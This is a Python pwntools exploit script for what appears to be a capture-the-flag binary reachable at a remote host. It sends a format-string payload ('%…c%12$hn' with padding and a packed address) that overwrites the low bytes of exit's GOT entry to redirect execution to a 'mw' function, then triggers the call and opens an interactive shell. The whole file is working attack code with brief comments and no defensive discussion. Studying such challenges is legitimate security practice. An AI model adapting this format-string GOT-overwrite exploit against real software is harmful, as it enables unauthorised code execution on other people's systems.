from pwn import *

# Establish a connection to the server
elf = context.binary = ELF('./chall')
#p = process()
p = remote('ctfify.1pc.tf', 19121)

# Get the addresses of the exit function in the GOT and the mw function
exit_got = 0x404060 
mw_addr = 0x4013a9

# Pause to attach a debugger if needed
#gdb.attach(p, gdbscript='''
#b *0x40135b
#''')

# Initial interaction with the program
p.sendlineafter(b'> ', b'2')

# Craft the format string payload to overwrite the lower 2 bytes of exit@got.plt
# with the address of mw. This is a common technique for format string exploits.
payload = b'%' + str(mw_addr & 0xffff).encode() + b'c%12$hn'
# The payload needs to be padded to 16 bytes to align the stack correctly for the write.
payload = payload.ljust(16, b'A')
# The final part of the payload is the address we want to write to (exit@got.plt)
payload += p64(exit_got)

# Send the payload
p.sendlineafter(b'> ', payload)

# Trigger the call to the overwritten exit function
p.sendlineafter(b'> ', b'4')

# Interact with the shell
p.interactive()